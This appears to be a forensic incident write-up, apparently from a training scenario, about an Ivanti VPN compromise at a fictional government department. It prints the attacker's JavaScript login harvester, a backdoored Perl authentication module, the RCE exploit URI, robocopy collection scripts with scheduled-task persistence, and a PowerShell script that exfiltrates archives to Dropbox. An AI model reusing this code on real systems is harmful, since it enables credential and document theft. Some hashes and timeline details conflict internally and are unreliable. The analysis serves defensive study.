## Table of Contents
- [Case Summary](#case-summary)
- [Initial Access](#initial-access)
- [Execution](#execution)
- [Persistence](#persistence)
- [Privilege Escalation](#privilege-escalation)
- [Defense Evasion](#defense-evasion)
- [Credential Access](#credential-access)
- [Discovery](#discovery)
- [Lateral Movement](#lateral-movement)
- [Collection](#collection)
- [Command and Control](#command-and-control)
- [Exfiltration](#exfiltration)
- [Indicators of Compromise](#indicators-of-compromise)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
## Department of Trade and Finance (DoTF) - The Meow Islands

## Case Summary
The intrusion began on June 30, 2025, when the threat actor deployed a JavaScript-based credential harvester on the Department of Trade and Finance's internet-facing Ivanti Connect Secure VPN appliance. This WARPWIRE variant intercepted authentication attempts at the login page, capturing usernames and passwords before transmitting them to an adversary-controlled endpoint. The threat actor also created symbolic links on the VPN appliance, replacing legitimate CGI scripts to enable covert access to system resources.

Just under a month later, on July 29, the threat actor returned and modified a critical Perl authentication module to harvest credentials from successful VPN logins, encrypting them with RC4 before writing them to a temporary file accessible via a symbolic link. Within 16 minutes of deploying this modification, the threat actor began retrieving the harvested credentials from IP address `34.205.82.129`, then repeating this access 71 times over the following days.

The next day, on July 30, the threat actor achieved remote code execution by exploiting CVE-2023-46805 and CVE-2024-21887 through a POST request to a vulnerable API endpoint. Hours later, they authenticated to the VPN using harvested credentials for the account `DOTF\jbennett` and initiated an RDP session to `meow-SRV01` through the VPN's web-based RDP feature.

One day after gaining initial access to the Windows environment, the threat actor began reconnaissance on `meow-SRV01`, executing commands like `ipconfig` and `nslookup` to enumerate the network. They downloaded SysInternals ADExplorer and used it to query the domain controller, pulling Active Directory data for further analysis. Within hours, they deployed their first data collection script and used robocopy to stage documents from remote workstations to local directories on `meow-SRV01`.

Over the next two days, the threat actor downloaded additional batch scripts and tools from their command and control domain, `mxb.yxz.red` (resolving to `34.205.82.129`). They created two scheduled tasks configured to run under SYSTEM privileges, executing an automated collection script twice daily at 03:00 and 21:00. This script used robocopy to recursively collect documents, spreadsheets, presentations, and email archives from three targeted users across `meow-WKS01`, `meow-WKS02`, and `meow-WKS03`, focusing on files modified within the previous seven days.

To evade detection, the threat actor deployed a DLL side-loading attack using a legitimate Avast Antivirus binary paired with a malicious `wsc.dll` file. They also cleared a log file with evidence of the RCE, although the evidence was preserved in a backup log file created by the appliance.

On August 1, approximately 33 hours after their first data collection operation, the threat actor created a PowerShell script designed to exfiltrate ZIP archives to Dropbox's API endpoint using a hardcoded access token. Network connection logs show PowerShell establishing HTTPS connections to Dropbox infrastructure (162.125.1.14:443) shortly after script creation, indicating an attempted exfiltration.

The scheduled tasks continued executing their collection operations on August 2, with Task Scheduler logs confirming successful completion of both the morning and evening runs. The Time to Exfiltration (TTE) for this intrusion was approximately 50 hours from initial Windows access to the exfiltration attempt, spanning three calendar days from VPN compromise to automated persistence.

---
### Initial Access
The adversary gained initial access by exploiting vulnerabilities CVE-2023-46805 and CVE-2024-21887 in the Ivanti Connect Secure VPN appliance [^3]. Analysis of the device logs revealed a POST request to the URI `/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection` on July 30, 2025 at 19:57:42, which achieved remote code execution on the appliance.

Evidence of this exploitation appears in `/mnt/ivanti/runtime/var/dlogs/config_rest_server.log.old`:
```
[pid: 22010|app: 0|req: 1/1] 172.20.1.4 () {34 vars in 581 bytes} [Wed Jul 30 19:57:42 2025] POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection => generated 54 bytes in 977 msecs (HTTP/1.1 200) 2 headers in 71 bytes
[pid: 22010|app: 0|req: 2/2] 172.20.1.4 () {34 vars in 581 bytes} [Wed Jul 30 19:58:00 2025] POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection => generated 54 bytes in 1803 msecs (HTTP/1.1 200) 2 headers in 71 bytes (1 switches on core 0)
```

The adversary deployed a credential harvesting capability on June 30, 2025 at 08:05:00 , predating the documented RCE attempt by 30 days. This indicates the threat actor maintained persistent access to the VPN appliance for an extended period.

[^3]: Mandiant. (2024). "Ivanti Connect Secure VPN Zero-Day." https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day

---
### Execution
The adversary executed malicious code through multiple mechanisms:

**JavaScript Credential Harvester (WARPWIRE Variant)**

On June 30, 2025 at 08:05:00 , the adversary created a malicious JavaScript file at `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/auth/lastauthserverused.js`. This credential harvester intercepted authentication attempts by modifying the login form to capture usernames and passwords, then transmitted them via XHR requests to `/dana-na/css/theme.css` with credentials encoded in base64. `theme.css` wasn't present on disk during the investigation.

Here is what `lastauthserverused.js` looks like:
```javascript
function Login(setCookies){
	var wdata=document.frmLogin.username.value;
	var sdata=document.frmLogin.password.value;
	
	if(wdata&&sdata){
		var payload=btoa(wdata+:+sdata);
		var xhr=new XMLHttpRequest();
		xhr.open(GET,/dana-na/css/theme.css?c=+payload,false);
		xhr.send(null);
	}
	LoginImpl();
	return true;
}
```

**Modified Perl Authentication Module**

On July 29, 2025 at 10:10:14 , the adversary modified the Perl authentication module `/mnt/ivanti/home/root/home/perl/DSAuth.pm`. This modification implemented an RC4 encryption routine with a hard-coded key to capture successful authentication credentials, then write the encrypted results to a file in `/tmp/`.

Here is what the new code looks like (comments by the attacker are preserved):
```perl
sub setPrompt{
    eval{
        my $res=@_[1]."=".@_[2]."\n";
        $ds_g .= $res;
    };
    return DSAuthc::RealmSignin_setPrompt(@_);
}
$ds_e="";
$ds_g1="";
sub encode_base64 ($;$)
{
    my $res = "";
    my $eol = $_[1];
    $eol = "\n" unless defined $eol;
    pos($_[0]) = 0;                          # ensure start at the beginning

    $res = join '', map( pack('u',$_)=~ /^.(\S*)/, ($_[0]=~/(.{1,45})/gs));

    $res =~ tr|` -_|AA-Za-z0-9+/|;               # `# help emacs
    # fix padding at the end
    my $padding = (3 - length($_[0]) % 3) % 3;
    $res =~ s/.{$padding}$/'=' x $padding/e if $padding;
    return $res;
}
sub runSignin{
    my $res=DSAuthc::RealmSignin_runSignin(@_);
    if(@_[1]->{status} != $DSAuth::Reject && 
        @_[1]->{status} != $DSAuth::Restart){
        if($ds_g ne ""){
            CORE::open(FH,">>/tmp/mIsession.log");
            my $dd=RC4("Me0wPwn",$ds_g);
            print FH encode_base64($dd)."\n";
            CORE::close(FH);
            $ds_g = ""; 
        }   
    }
    elsif(@_[1]->{status} == $DSAuth::Reject || 
            @_[1]->{status} == $DSAuth::Restart){
        $ds_g = ""; 
    }
    return $res;
}
```

**PowerShell and Batch Script Execution**

The adversary executed PowerShell commands for reconnaissance activities on July 31, 2025 beginning at 20:16:49 . The adversary deployed multiple batch scripts for data collection, including `backup.bat`, `back.bat`, and `shed.bat`. The adversary also executed a PowerShell exfiltration script `backupClient.ps1` on August 1, 2025 at 21:47:42 .

The contents of `backup.bat` follows:
```shell
@echo off
mkdir "c:\programdata\Log\chernandez\" 2>nul
mkdir "c:\programdata\Log\bwilliams\" 2>nul
mkdir "c:\programdata\Log\plopez\" 2>nul

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\ c:\programdata\Log\chernandez\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.ost *.pst /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\chernandez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Documents c:\programdata\Log\bwilliams\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\bwilliams-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Documents c:\programdata\Log\plopez\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\plopez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\Desktop c:\programdata\Log\chernandez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\chernandez-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Desktop c:\programdata\Log\bwilliams\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\bwilliams-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Desktop c:\programdata\Log\plopez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\log\plopez-desk-log.txt
```

`back.bat` wasn't present on the disk at the time of investigation.

This is `shed.bat`:
```shell
@echo off
setlocal enabledelayedexpansion

if /i "%~1"=="/setup" goto :SETUP_TASK

mkdir "c:\programdata\Logs\chernandez\" 2>nul
mkdir "c:\programdata\Logs\bwilliams\" 2>nul
mkdir "c:\programdata\Logs\plopez\" 2>nul

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\ c:\programdata\Logs\chernandez\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.ost *.pst /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\chernandez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Documents c:\programdata\Logs\bwilliams\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\bwilliams-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Documents c:\programdata\Logs\plopez\Documents\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\plopez-docs-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks01\c$\users\chernandez\Desktop c:\programdata\Logs\chernandez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\chernandez-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks02\c$\users\bwilliams\Desktop  c:\programdata\Logs\bwilliams\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\bwilliams-desk-log.txt

C:\WINDOWS\System32\Robocopy.exe \\meow-wks03\c$\users\plopez\Desktop c:\programdata\Logs\plopez\Desktop\ *.txt *.doc *.xls *.ppt *.docx *.xlsx *.pptx *.pdf *.vsd *.vsdx *.edx *.config *.cfg *.rtf *.lnk *.csv *.pptm *.pst *.ost /maxage:7 /S /xf *.tmp *.bak /log:c:\programdata\logs\plopez-desk-log.txt

goto :eof

:SETUP_TASK
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Setup requires administrative privileges
    echo Please run as administrator
    pause
    exit /b 1
)

set "TASK_NAME_AM=Robocopy_Backup_AM"
set "TASK_NAME_PM=Robocopy_Backup_PM"
set "RUN_TIME_AM=03:00"
set "RUN_TIME_PM=21:00"
set "TARGET_DIR=C:\ProgramData\Logs"
set "TARGET_SCRIPT=%TARGET_DIR%\shed.bat"
set "SCRIPT_PATH=%~f0"

echo Setting up scheduled tasks...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" 2>nul

:: Copy script to known location
if not "%SCRIPT_PATH%"=="%TARGET_SCRIPT%" (
    copy /Y "%SCRIPT_PATH%" "%TARGET_SCRIPT%" >nul
)

:: Remove existing tasks if present
schtasks /query /tn "%TASK_NAME_AM%" >nul 2>&1
if %errorLevel%==0 schtasks /delete /tn "%TASK_NAME_AM%" /f >nul

schtasks /query /tn "%TASK_NAME_PM%" >nul 2>&1
if %errorLevel%==0 schtasks /delete /tn "%TASK_NAME_PM%" /f >nul

:: Create new tasks
schtasks /create /tn "%TASK_NAME_AM%" /tr "cmd /c \"%TARGET_SCRIPT%\"" /sc daily /st %RUN_TIME_AM% /ru SYSTEM /rl highest /f
schtasks /create /tn "%TASK_NAME_PM%" /tr "cmd /c \"%TARGET_SCRIPT%\"" /sc daily /st %RUN_TIME_PM% /ru SYSTEM /rl highest /f

echo.
echo Scheduled tasks created:
echo - %TASK_NAME_AM% at %RUN_TIME_AM%
echo - %TASK_NAME_PM% at %RUN_TIME_PM%
echo.
pause
exit /b
```

**Scheduled Task Execution**

The adversary created two scheduled tasks on August 1, 2025 at 21:07:00 and 21:07:01 , named `Robocopy_Backup_AM` and `Robocopy_Backup_PM`, configured to execute `C:\ProgramData\Logs\shed.bat` daily at 03:00 and 21:00 respectively. Event ID 106 logs confirm they were registered on August 1, 2025.

The command-line creation of the scheduled tasks looks like this:

```shell
schtasks  /create /tn "Robocopy_Backup_AM" /tr "cmd /c \"C:\..\shed.bat"" /sc daily /st 03:00 /ru SYSTEM /rl highest /f
```

---
### Persistence
The adversary established multiple persistence mechanisms:

**Modified System Files**

The adversary created three CGI files on the Ivanti appliance on June 30, 2025 at 06:57:43, replacing their contents with symbolic links to `/tmp/wsh.cgi`:
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/jam/getComponent.cgi`
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/auth/restAuth.cgi`
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi`

---
### Privilege Escalation
The adversary compromised two domain accounts with elevated privileges:

**Account: DOTF\jbennett**

Initial compromise occurred on July 30, 2025 at 08:48:20 when the adversary authenticated from IP address 34.205.82.129 using credentials harvested through the WARPWIRE JavaScript credential harvester. The account possessed administrative access to multiple systems.

**Account: DOTF\svc-admin**

The adversary harvested credentials for this service account through the modified Perl authentication module. The account name suggests administrative or service-level privileges within the domain.

---
### Defense Evasion
The adversary employed multiple techniques to evade detection:

**Log Manipulation**

The adversary cleared the exploitation log file `/mnt/ivanti/runtime/var/dlogs/config_rest_server.log` to remove evidence of the remote code execution attempt. Evidence was recovered from `config_rest_server.log.old` in the same directory owing to an automatic backup.

**DLL Side-Loading**

On August 1, 2025 at 21:39:25, the adversary deployed a DLL side-loading attack using a legitimate Avast Antivirus binary (`wsc_proxy.exe`, SHA1: 80305BED318B3124F3C3F5C5A1E577BD0A1AC498). The adversary placed a malicious DLL named `wsc.dll` (SHA1: EA62CE315C2AAA19D7C13D9D9E9584756ABDC503) in the same directory. Event ID 7 logs confirm the malicious DLL loaded into the legitimate process.

VirusTotal analysis of `wsc_proxy.exe` indicates: "The code loads the legitimate `wsc.dll`, retrieves a function address from it, and then passes its own command line arguments to that function. This DLL proxying technique allows the malware to intercept and potentially manipulate calls to the legitimate system library."

**Symbolic Link Obfuscation**

The adversary created symbolic links to access harvested credential data via the web interface without writing files directly to web-accessible directories. On July 29, 2025 at 10:10:39 , the adversary created a symbolic link at `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/css/meow-log.css` pointing to `/tmp/mIsession.log`, which contained encrypted credentials.

---
### Credential Access
The adversary deployed two distinct credential harvesting mechanisms:

**WARPWIRE JavaScript Harvester**

The JavaScript harvester captured all login attempts, including failed authentications, by intercepting form submissions before they reached the legitimate authentication handler. The code transmitted base64-encoded credentials to the adversary-controlled endpoint `/dana-na/css/theme.css` with the captured data encoded in a URL parameter.

**Modified Perl Authentication Module**

The modified Perl code captured only successful authentications. The adversary implemented RC4 encryption with a hard-coded key to protect harvested credentials. Analysis of the modified module revealed the encryption key used for credential protection.

**Harvested Credentials**

The adversary successfully harvested credentials for two domain accounts:
- `DOTF\jbennett`
- `DOTF\svc-admin`

The adversary accessed the harvested credentials file 71 times from IP address `34.205.82.129`, with the first access occurring on July 29, 2025 at 10:26:56.

---
### Discovery
The adversary conducted extensive reconnaissance of the network environment and AD:

**Network Reconnaissance**

On July 31, 2025 beginning at 20:16:49 , the adversary executed the following commands from `meow-SRV01`:
- `ipconfig.exe` 
- `nslookup.exe meow-srv01`
- `nslookup.exe dotf.gov.meow`
- `nslookup.exe meow-wks01`
- `nslookup.exe meow-wks02`
- `nslookup.exe meow-wks03`
- `quser.exe /server:10.20.2.1`
- `quser.exe /server:10.20.2.5`
- `quser.exe /server:10.20.2.12`
- `quser.exe /server:10.20.2.13`

All commands executed from parent process PowerShell.exe (PID 1112).

**Active Directory Enumeration**

The adversary downloaded ADExplorer.exe (Sysinternals Active Directory Explorer) on July 31, 2025 at 20:16:20 to `C:\Users\jbennett\Downloads\`. Event ID 11 logs show the creation of a Zone.Identifier alternate data stream, indicating the file originated from the internet (Edge was used to download it). The adversary executed ADExplorer.exe at 20:16:22 , generating 16 network connections to domain controller IP address 10.20.2.5 on port 389 (LDAP).

**Session Enumeration**

The adversary executed `net session` on August 1, 2025 at 01:54:07 from `meow-SRV01` to enumerate active SMB sessions and identify potential lateral movement targets.

---
### Lateral Movement
The adversary moved laterally through the environment using RDP over the SSL VPN connection:

**Initial RDP Access**

On July 30, 2025 at 08:55:44 , the adversary initiated an RDP session to `meow-SRV01` (10.20.2.6:3389) using the SSL VPN bookmark "RDP to SRV01 via Browser" with account `DOTF\jbennett`.

**Compromised Systems**

Analysis of data collection operations and tool deployment indicates the adversary accessed the following systems:
- `meow-SRV01` (10.20.2.6) - Initial access point and staging server
- `meow-WKS01` ( 10.20.3.11) - Target for data collection operations
- `meow-WKS02` (10.20.3.12)- Target for data collection operations
- `meow-WKS03` (10.20.3.13) - Target for data collection operations and tool deployment

**Lateral Movement Timeline**

Event ID 21 (Remote Desktop Services: Session logon succeeded) logs indicate the adversary used `DOTF\svc-admin` credentials for lateral movement between systems after the initial compromise of `DOTF\jbennett`.

---
### Collection
The adversary performed targeted data collection from user profiles across multiple systems:

**Collection Tool: robocopy.exe**

The adversary used the native Windows utility robocopy.exe to collect files from remote systems. The first documented collection operation occurred on July 31, 2025 at 23:43:31.

**Targeted File Types**

The adversary configured Robocopy to collect files with the following extensions: .txt, .doc, .xls, .ppt, .docx, .xlsx, .pptx, .pdf, .vsd, .vsdx, .edx, .config, .cfg, .rtf, .lnk, .csv, .pptm, .ost, .pst

**Collection Parameters**

- Time window: Files modified within the last 7 days (`/maxage:7`)
- Recursive collection: Enabled (`/S`)
- Excluded file types: .tmp, .bak (`/xf *.tmp *.bak`)
- Logging: Enabled with append mode (`/LOG+:`)

**Targeted Users**

The adversary collected data from three user profiles:
1. `chernandez` (`meow-WKS01`)
2. `bwilliams` (`meow-WKS02`)
3. `plopez` (`meow-WKS03`)

**Collection Scope**

The adversary targeted two primary locations within each user profile:
- Documents folder: `\\<hostname>\c$\users\<username>\Documents`
- Desktop folder: `\\<hostname>\c$\users\<username>\Desktop`

**Staging Location**

Collected files staged at `C:\ProgramData\Log\<username>\` and `C:\ProgramData\Logs\<username>\` on `meow-SRV01` and `meow-WKS03`.

**Automated Collection Script**

The adversary deployed a comprehensive collection script (`shed.bat`) that:
- Created staging directories for each target user
- Executed six separate robocopy operations (Documents and Desktop for three users)
- Maintained individual log files for each collection operation
- Contained a setup routine for scheduled task creation with administrative privilege checks

---
### Command and Control
The adversary established command and control through multiple infrastructure components:

**C2 Domain**

The adversary staged tools and scripts on the domain `mxb.yxz.red`. Event ID 22 (DNS query) logs show DNS resolution of this domain from `meow-SRV01` on August 1, 2025 at 01:53:13 , resolving to IP address 34.205.82.129.

**C2 Infrastructure**

IP address 34.205.82.129 served as the primary command and control node. This IP address performed the following activities:
- First URI accessed: `/dana-na/auth/url_default/welcome.cgi` (July 29, 2025 at 10:26:54 )
- Retrieved harvested credentials via symbolic link 71 times
- Delivered malicious tools and scripts to compromised hosts
- Authenticated to SSL VPN as `DOTF\jbennett`

**Custom User-Agent**

The adversary used a distinctive user-agent string for identification: `Mozilla/5.0 (=ↀωↀ=) MeowBrowser/1.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)`

This user-agent first appeared in VPN authentication logs on July 29, 2025 at 12:29:22 during a failed login attempt.

**Tool Delivery**

The adversary downloaded the following files from the C2 infrastructure:
- `back.bat` - Downloaded August 1, 2025 at 01:53:28 
- `backup.bat` - Downloaded August 1, 2025 at 21:05:51 
- `shed.bat` - Downloaded August 1, 2025 at 21:05:55 
- `BackupClient.zip` - Downloaded August 1, 2025 at 21:37:55 

Zone.Identifier alternate data streams confirm all files originated from `http://mxb.yxz.red/`.

---
### Exfiltration
The adversary attempted data exfiltration using cloud storage infrastructure:

**Exfiltration Tool: PowerShell Script**

The adversary created `C:\ProgramData\Logs\backupClient.ps1` on August 1, 2025 at 21:47:12. Event ID 4104 (PowerShell Script Block Logging) confirms execution of this script at 21:47:45 .

Here is the script:
```powershell
$AccessToken = "sl.u.AF6ZjwaU..truncated.."
$CurrentDir = Get-Location
$ZipFiles = Get-ChildItem -Path $CurrentDir -Filter *.zip -File
$DropboxApiUrl = "https://content.dropboxapi.com/2/files/upload"

foreach ($File in $ZipFiles) {
    $DropboxPath = "/$($File.Name)"  # Upload to root of Dropbox or change this path

    $Headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/octet-stream"
        "Dropbox-API-Arg" = (@{
            path = $DropboxPath
            mode = "add"
            autorename = $true
            mute = $false
        } | ConvertTo-Json -Compress)
    }

    Write-Host "Uploading $($File.Name) to Dropbox..."

    try {
        Invoke-RestMethod -Uri $DropboxApiUrl -Method Post -Headers $Headers -InFile $File.FullName
        Write-Host "Uploaded: $($File.Name)`n"
    } catch {
        Write-Warning "Failed to upload $($File.Name): $_"
    }
}
```

**Exfiltration Destination**

The script targeted the Dropbox API endpoint: `https://content.dropboxapi.com/2/files/upload`

**Exfiltration Method**

The PowerShell script implemented the following exfiltration workflow:
1. Identified all .zip files in the current directory
2. Constructed Dropbox API headers with embedded access token
3. Uploaded each file individually using `Invoke-RestMethod`

**Network Activity**

Event ID 3 (Network Connection Detected) logs show PowerShell.exe establishing an HTTPS connection to IP address 162.125.1.14 on port 443 at August 1, 2025 at 21:47:42 , consistent with Dropbox API communication.

**Access Token**

The exfiltration script contained a hardcoded Dropbox access token.

### Impact
The intrusion resulted in the following impacts to DoTF operations:

**Compromised Systems**

Four Windows systems experienced unauthorized access:
- 1 server (`meow-SRV01`)
- 3 workstations (`meow-WKS01`, `meow-WKS02`, `meow-WKS03`)
- 1 edge security appliance (Ivanti Connect Secure VPN)

**Compromised Accounts**

Two domain accounts experienced credential compromise:
- `DOTF\jbennett` (user account with administrative privileges)
- `DOTF\svc-admin` (service account)

**Data Exposure**

The adversary collected sensitive documents from three user profiles belonging to DoTF personnel. Collection parameters targeted files modified within 7 days prior to collection operations, indicating focus on current operational documents. The specific document types targeted (policy documents, spreadsheets, presentations, configuration files, email archives) suggest the adversary sought trade policy information, financial data, and organizational communications.

**Persistence Mechanisms**

The adversary established automated collection capabilities through scheduled tasks executing twice daily. These tasks would continue operating until administrative intervention, enabling ongoing data collection.

**Operational Security Compromise**

The modification of the Perl authentication module created ongoing credential harvesting capabilities, exposing all VPN authentication attempts to adversary collection. The deployment of the WARPWIRE JavaScript harvester enabled passive credential collection from any user accessing the VPN login page.

---

## Indicators of Compromise
### Network Indicators
**IP Addresses**

- `34.205.82.129` - Primary C2 infrastructure, VPN authentication, credential retrieval
- `188.210.211.178` - First access of credential harvesting symbolic link (July 29, 2025 at 10:26:41 )
- `162.125.1.14` - Dropbox API endpoint for exfiltration
- `172.20.1.4` - Internal Ivanti VPN appliance IP

**Domains**

- `mxb.yxz.red` - C2 domain for tool staging and delivery

**URIs (Ivanti Connect Secure)**

- `/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection` - RCE exploit URI
- `/dana-na/css/meow-log.css` - Symbolic link to harvested credentials
- `/dana-na/css/theme.css` - WARPWIRE credential exfiltration endpoint
- `/dana-na/css/accessibility.css` - Database cache access point
- `/dana-na/css/colorblind.css` - Database cache access point
- `/dana-na/css/themes-dark.css` - Database cache theft
- `/dana-na/auth/url_default/welcome.cgi` - First URI accessed by adversary

**User-Agent String**

- `Mozilla/5.0 (=ↀωↀ=) MeowBrowser/1.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)`

### File System Indicators
**Ivanti Connect Secure Appliance**
Malicious Files Created:
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/auth/lastauthserverused.js` (June 30, 2025 @ 08:05:00)
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/css/meow-log.css` (July 29, 2025 @ 10:10:39)
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/css/accessibility.css` (July 29, 2025 @ 10:11:30)
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/css/colorblind.css` (July 29, 2025 @ 10:11:46)
- `/mnt/ivanti/home/root/home/webserver/htdocs/dana-na/css/themes-dark.css` (July 30, 2025 @ 09:58:39)
- `/mnt/ivanti/swap/mIsession.log` (August 1, 2025 @ 21:04:53) - Contains encrypted credentials

Modified System Files:
- `/mnt/ivanti/home/root/home/perl/DSAuth.pm` (July 29, 2025 @ 10:10:14)
  - Expected SHA1: documented in `/etc/manifest/manifest`
  - Modified for credential harvesting

**Windows Hosts (meow-SRV01)**
Tools and Utilities:
- `C:\Users\jbennett\Downloads\ADExplorer.exe` (Downloaded: July 31, 2025 @ 20:16:20)
- `C:\Users\jbennett\Downloads\back.bat` (Downloaded: August 1, 2025 @ 01:53:28, SHA1: N/A)
- `C:\Users\svc-admin\Downloads\backup.bat` (Downloaded: August 1, 2025 @ 21:05:51, SHA1: 938151C8EF33735C2F0482EC8C8AE4CE9AC7F367)
- `C:\Users\svc-admin\Downloads\shed.bat` (Downloaded: August 1, 2025 @ 21:05:55, SHA1: 70AC4F6D13152EECB09980D0276FD446D1659C7F)
- `C:\Users\svc-admin\Downloads\BackupClient.zip` (Downloaded: August 1, 2025 @ 21:37:55, SHA1: c02e81a5da8ac38e30bd7bbdca6012f95bf2a5bb)

Malicious Payloads:
- `C:\ProgramData\Logs\BackupClient\Mcaffee\wsc_proxy.exe` (SHA1: 80305BED318B3124F3C3F5C5A1E577BD0A1AC498)
- `C:\ProgramData\Logs\BackupClient\Mcaffee\wsc.dll` (SHA1: EA62CE315C2AAA19D7C13D9D9E9584756ABDC503)
- `C:\ProgramData\Logs\BackupClient\Mcaffee\bak.exe` (SHA1: 99C3B4CB6DEFD1663565B200D2D8F5106ECF68B8)

Scripts:
- `C:\ProgramData\Logs\backupClient.ps1` (SHA1: 938151C8EF33735C2F0482EC8C8AE4CE9AC7F367)

---

### MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
|--------|--------------|----------------|
| Initial Access | T1190 | Exploit Public-Facing Application |
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell |
| Execution | T1053.005 | Scheduled Task/Job: Scheduled Task |
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task |
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |
| Privilege Escalation | T1053.005 | Scheduled Task/Job: Scheduled Task |
| Defense Evasion | T1070.001 | Indicator Removal: Clear Windows Event Logs |
| Defense Evasion | T1574.002 | Hijack Execution Flow: DLL Side-Loading |
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name or Location |
| Credential Access | T1056.001 | Input Capture: Keylogging |
| Credential Access | T1555 | Credentials from Password Stores |
| Discovery | T1016 | System Network Configuration Discovery |
| Discovery | T1018 | Remote System Discovery |
| Discovery | T1087.002 | Account Discovery: Domain Account |
| Discovery | T1069 | Permission Groups Discovery |
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol |
| Collection | T1039 | Data from Network Shared Drive |
| Collection | T1005 | Data from Local System |
| Collection | T1074.001 | Data Staged: Local Data Staging |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols |
| Command and Control | T1102.002 | Web Service: Bidirectional Communication |
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage |
